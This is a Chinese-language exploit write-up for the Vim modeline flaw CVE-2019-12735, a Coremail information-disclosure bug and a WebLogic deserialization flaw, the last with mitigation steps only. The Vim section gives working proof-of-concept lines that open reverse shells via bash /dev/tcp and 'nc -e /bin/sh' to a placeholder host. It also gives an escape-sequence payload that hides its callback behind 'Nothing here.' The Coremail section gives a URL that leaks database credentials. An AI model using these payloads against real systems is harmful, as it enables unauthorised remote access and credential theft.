    0X01 基于VIM漏洞 (CVE-2019-12735)

    漏洞描述：

    该漏洞是由于装有vim或者neovim的主机通过modeline打开一个特意设计的文本文件来执行任意代码，从而可导任意代码执行漏洞。

    漏洞影响版本：

    Vim < 8.1.1365，Neovim < 0.3.6

    漏洞产生条件：

    (1)所使用的vim或者Neovim版本在受影响范围内：Vim < 8.1.1365，Neovim < 0.3.6
    (2)必须开启modeline选项(ubuntu等默认关闭)

    示例一、

    步骤一、 根据前面介绍vim漏洞产条件是必须开启modeline，首先检测是否开启modeline。
    在终端输入vim，打开vim界面，输入:set modeline?，当返回nomodeline表示未开启。

    步骤二、 开启modeline
    在终端输入：ls -la //查看是否存在.vimrc，如果之前没有对.vimrc进行过操作，默认是不存在的
    在终端输入：vim ~/.vimrc //创建.vimrc 并在其中输入 set modeline 之后保存退出
    在终端输入：ls -la //查看是否存在.vimrc

    步骤三、 利用poc漏洞检测
    创建poc.txt文本文件，在其中输入如下代码内容并保存退出：

    :!whoami||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

    步骤四、 通过vim再次打开刚刚创建的poc.txt文件
    可以看到执行了系统命令whoami

    也可以执行其它指令，只需要将上面代码的whoami换成相应指令即可。当然也可以反弹一个shell

    :!bash -c "bash -i >& /dev/tcp/xx.xx.xx.xx/9999 0>&1"||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

    步骤五、 创建shell.txt文件，在其中输入如下代码内容并保存退出：

    \x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc xx.xx.xx.xx 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\ fde=x\ \|\ source\!\ \%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n

    步骤六、 vim打开文件后，执行代码进行了隐藏，只显示Nothing here

    步骤七、 在vps上进行监听如下：

    nc -lvvp 9999

    注：亦可将nohup nc xx.xx.xx.xx 9999 -e /bin/sh &换成 bash -c "bash -i >& /dev/tcp/xx.xx.xx.xx/9999 0>&1
    以上poc和shell脚本可在下载：VIM漏洞 (CVE-2019-12735)

    0X02 Coremail邮件系统信息泄露 (CNVD-2019-16798)

    coremail邮件系统简介：

    Coremail邮件系统是论客科技（广州）有限公司（以下简称论客公司）自主研发的大型企业邮件系统，为客户提供电子邮件整体技术解决方案及企业邮局运营服务。Coremail邮件系统作为我国第一套中文邮件系统，客户范围涵盖党政机关、高校、知名企业以及能源、电力、金融等重要行业单位，在我国境内应用较为广泛。

    coremail系统(CNVD-2019-16789)漏洞描述：

    由于Coremail邮件系统的mailsms模块的参数大小写敏感存在缺陷，使得攻击者在未授权的情况下，通过远程访问URL地址造成数据库连接参数等系统敏感配置信息泄露，其主要包括：文件路径、IP、端口、数据库用户、密码等敏感信息。

    coremail最主要影响版本：

    Coremail XT 3.0.4 ~ XT5.0.8A （XT 5.0.9及以上版本已修复）

    coremail利用poc：

    Coremail_url + /mailsms/s?func=ADMIN:appState&dumpConfig=/

    0X03 Weblogic远程命令执行漏洞 (CVE-2019-2725绕过/CNVD-C-2019-48814)

    漏洞描述：
    在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。

    漏洞影响版本：
    Oracle WebLogic Server 10.*
    Oracle WebLogic Server 12.1.3

    漏洞分析：

    漏洞修复：
    1、及时打补丁；
    1、通过访问策略控制禁止 /_async/跟/wls-wsat/ 路径的URL访问；
    2、删除 wls9_async_response.war 与 wls-wsat.war 文件及相关文件夹，并重启 Weblogic 服务。进行删除操作可能造成未知后果，请谨慎操作；
